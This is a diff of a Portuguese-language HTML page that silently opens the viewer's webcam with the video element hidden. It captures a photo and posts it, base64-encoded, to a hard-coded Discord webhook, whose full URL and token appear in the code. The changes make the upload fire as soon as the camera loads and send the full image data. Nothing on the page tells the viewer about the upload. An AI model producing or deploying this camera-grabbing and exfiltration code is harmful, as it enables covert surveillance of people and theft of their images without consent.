@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <title></title>
-  <style>
-    body {
-      margin: 0;
-      background: #000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    video {
-      display: none; /* esconde o vídeo */
-    }
-    img {
-      max-width: 90vw;
-      max-height: 90vh;
-      border: none;
-      display: block;
-    }
-  </style>
+<meta charset="UTF-8" />
+<title>Foto e Envio Discord</title>
+<style>
+  body {
+    margin: 0;
+    background: #000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  video {
+    display: none;
+  }
+  img {
+    max-width: 90vw;
+    max-height: 90vh;
+    border: none;
+    display: block;
+  }
+</style>
 </head>
 <body>
   <video id="video" autoplay playsinline></video>
@@ -29,15 +29,14 @@
   <script>
     const video = document.getElementById('video');
     const photo = document.getElementById('photo');
-
-    const webhookURL = 'https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi'; // <== substitua pelo seu webhook do Discord
+    const webhookURL = 'https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi'; // substitua aqui
 
     async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        setTimeout(async () => {
+        video.onloadedmetadata = async () => {
           const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
@@ -46,31 +45,22 @@
           const dataURL = canvas.toDataURL('image/png');
           photo.src = dataURL;
 
-          // Enviar para o webhook
-          const base64Data = dataURL.split(',')[1]; // Remove o prefixo "data:image/png;base64,"
-          await fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              username: 'Camera Bot',
-              avatar_url: '',
-              embeds: [{
-                title: 'Foto capturada',
-                image: { url: `attachment://photo.png` },
-              }],
-              // Para enviar a imagem em base64 como arquivo, precisamos usar multipart/form-data,
-              // mas isso não é trivial via fetch no navegador.
-              // Portanto, vamos enviar só a imagem como link embutido mesmo — não funciona diretamente.
-              // Alternativa: enviar a imagem como mensagem base64 no conteúdo (não ideal)
-              content: 'Foto capturada via câmera.',
-            }),
-          });
+          // Enviar a imagem base64 direto no conteúdo da mensagem Discord
+          const content = `Foto capturada:\n${dataURL}`;
 
-          // Desliga a câmera
+          try {
+            await fetch(webhookURL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ content }),
+            });
+            console.log('Foto enviada para o Discord');
+          } catch (err) {
+            console.error('Erro ao enviar para Discord:', err);
+          }
+
           stream.getTracks().forEach(track => track.stop());
-        }, 3000);
+        };
       } catch (err) {
         console.error('Erro ao acessar a câmera:', err);
       }
